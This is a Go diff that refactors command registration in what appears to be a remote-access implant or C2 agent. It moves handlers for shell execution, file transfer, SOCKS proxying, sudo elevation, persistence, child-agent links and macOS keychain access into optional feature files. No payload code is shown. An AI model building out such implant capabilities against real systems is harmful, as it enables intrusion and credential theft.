@@ -70,16 +70,10 @@ func NewCommandQueue() *WorkQueue {
 		activeUploads:   make(map[string]*SI, 4),      // Pre-allocate for concurrent uploads
 	}
 
-	// Register all core commands using numeric IDs
-	// Cross-platform commands (1-18)
+	// Register core commands (always available)
 	queue.registerHandler(CmdCd, wrapCommand(&ChDirMsg{}))
 	queue.registerHandler(CmdLs, wrapCommand(&ListDirMsg{}))
 	queue.registerHandler(CmdPwd, wrapCommand(&GetDirMsg{}))
-	queue.registerHandler(CmdDownload, wrapCommand(&FM{}))
-	queue.registerHandler(CmdUpload, wrapCommand(&SendMsg{}))
-	queue.registerHandler(CmdShell, wrapCommand(&ExecMsg{}))
-	queue.registerHandler(CmdSocks, wrapCommand(&ProxyMsg{}))
-	queue.registerHandler(CmdSocksHTTP, wrapCommand(GetSocksHTTPHandler()))
 	queue.registerHandler(CmdJobkill, wrapCommand(&WorkStopMsg{}))
 	queue.registerHandler(CmdExit, wrapCommand(&QuitMsg{}))
 	queue.registerHandler(CmdSleep, wrapCommand(&IntervalMsg{}))
@@ -92,17 +86,10 @@ func NewCommandQueue() *WorkQueue {
 	queue.registerHandler(CmdRm, wrapCommand(&RemoveMsg{}))
 	queue.registerHandler(CmdWhoami, wrapCommand(&WhoamiCommand{}))
 
-	// Linux/Darwin specific commands (100-101)
-	queue.registerHandler(CmdSudoSession, wrapCommand(&ElevMsg{}))
-	queue.registerHandler(CmdPersist, wrapCommand(&SetupMsg{}))
-
-	// link commands (230-232) - for TCP child agent connections
-	queue.registerHandler(CmdLink, wrapCommand(&RM{}))
-	queue.registerHandler(CmdUnlink, wrapCommand(&DM{}))
-	queue.registerHandler(CmdLinks, wrapCommand(&RLM{}))
-
-	// Darwin only commands (300)
-	queue.registerHandler(CmdKeychain, wrapCommand(&SecStoreMsg{}))
+	// Register optional feature handlers (populated by init() in register_*.go files)
+	for _, reg := range featureHandlers {
+		queue.registerHandler(reg.id, reg.handler)
+	}
 
 	// Start cleanup goroutine for stale transfers
 	go queue.cleanupStaleTransfers()
